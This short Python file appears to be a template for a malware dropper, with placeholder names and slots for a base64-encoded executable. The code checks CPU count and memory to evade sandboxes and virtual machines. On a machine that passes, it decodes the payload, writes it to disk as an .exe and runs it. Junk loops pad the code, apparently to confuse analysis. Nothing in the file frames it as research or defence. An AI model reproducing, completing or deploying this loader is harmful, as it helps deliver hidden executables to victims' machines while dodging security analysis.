import base64 as <base64>
import psutil as <psutil>


def <rr>():
    <process> = <psutil>.Popen("<nomescript>.exe")

    while <process>.is_running():
        None

def <rr2>():
    None
    exit(0)
    
def <filed>():
    <p2> = '{p2}'
    for i in range(6666):
        if i == False:
            continue

    f = i + 25

    x = 1
    while x < 30:
        x += 1

    <p1> = '{p1}'
    <junto> = <p1> + <p2>
    return <base64>.b64decode(<junto>)

def <savef>():
    with open("<nomescript>.exe", "wb") as f:
        f.write(<filed>())


<fcpu> = <psutil>.cpu_count(logical=False)
<lcpu> = <psutil>.cpu_count(logical=True)
<cpu> = <fcpu> + <lcpu>

<memtotal> = <psutil>.virtual_memory().total
<mem> = <memtotal> / (1024 ** 2)


if <mem> > 8000 and <cpu> > 3:
    <savef>()
    <rr>()

else:
    for x in range(12342):
        if x > 1000:
            <rr2>()
